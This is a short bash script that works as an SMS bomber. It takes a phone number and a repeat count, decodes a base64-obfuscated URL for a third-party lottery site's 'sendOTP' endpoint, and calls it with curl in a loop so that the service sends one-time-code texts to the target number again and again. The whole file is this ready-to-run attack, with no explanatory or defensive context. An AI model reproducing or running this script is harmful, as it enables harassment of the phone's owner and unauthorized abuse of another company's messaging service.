if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <phone_number> <iteration_count>"
    exit 1
fi

phoneNumber="$1"
iteration_count="$2"

if ! echo "$iteration_count" | grep -qE '^[0-9]+$'; then
    echo "Error: <iteration_count> must be a valid positive integer."
    exit 1
fi

decoded_url=$(echo "aHR0cHM6Ly9sb3R0ZXJ5LWFwaXMtenFta2tscDViYS1lbS5hLnJ1bi5hcHAvc2VuZE9UUC8/cGhvbmU9" | base64 --decode)

full_url="${decoded_url}${phoneNumber}"

for ((i=1; i<=iteration_count; i++)); do
    echo "Sending SMS $i:"
    curl "$full_url"
    echo

    # response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
    
  
done
